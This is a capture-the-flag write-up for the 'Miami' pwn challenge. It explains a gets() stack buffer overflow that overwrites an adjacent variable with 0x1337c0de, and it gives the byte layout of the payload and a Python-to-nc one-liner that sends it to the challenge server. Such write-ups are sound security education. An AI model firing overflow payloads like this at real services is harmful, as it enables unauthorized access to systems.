# Miami â€” Writeup

**Category:** pwn / binary exploitation

**Challenge summary**

Dexter is suspected to be the Bay Harbor Butcher. The binary `miami` asks for "Dexter's password"; with a wrong password it prints `Invalid credentials!`, but if we manage to control an internal variable the program prints `Access granted...` and reveals the proof/flag. The binary is a 64-bit PIE ELF and contains a vulnerable `vuln()` function using `gets()`.

---

## Reconnaissance

Run some basic commands to learn about the target:

```
file miami
# ELF 64-bit LSB PIE executable, x86-64, dynamically linked

strings ./miami
# shows functions: gets, puts, fopen, fread, read_flag, and a reference to flag.txt
```

The presence of `gets` in the strings strongly suggests a classic stack-based buffer overflow vulnerability.

- There's a local buffer `char local_58[76];` (size = 76 bytes).
- There's an `int local_c;` placed after the buffer in the stack frame.
- The program calls `gets(local_58);` to read user input with no length check.
- Later the code checks `if (local_c == 0x1337c0de) { puts("Access granted..."); read_flag(); }`

This is a textbook *buffer overflow to overwrite a nearby stack variable* rather than return-address overwrite. The goal is to overwrite `local_c` with `0x1337c0de`.

On x86_64, integers are 4 bytes and the ABI and typical stack layout use little-endian for multi-byte values. Thus `0x1337c0de` in little-endian is the byte sequence: `\xde\xc0\x37\x13`.

---

## Exploitation plan

1. Fill the buffer with exactly 76 bytes (any bytes) to reach the saved area directly after `local_58`.
2. Overwrite the 4-byte `local_c` with the little-endian value `0x1337c0de`.
3. Send a newline to terminate input (since `gets()` reads until newline).
4. The program will then detect `local_c == 0x1337c0de` and print `Access granted...` and (depending on implementation) call `read_flag()` or open `flag.txt`.

**Payload layout** (bytes):

```
[A x 76] + [\xde\xc0\x37\x13] + [\n]
```

## One-line exploit (remote with nc)

Use this one-liner to send the payload to the remote service provided in the challenge:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xde\xc0\x37\x13" + b"\n")' | nc chal.sunshinectf.games 25601
```
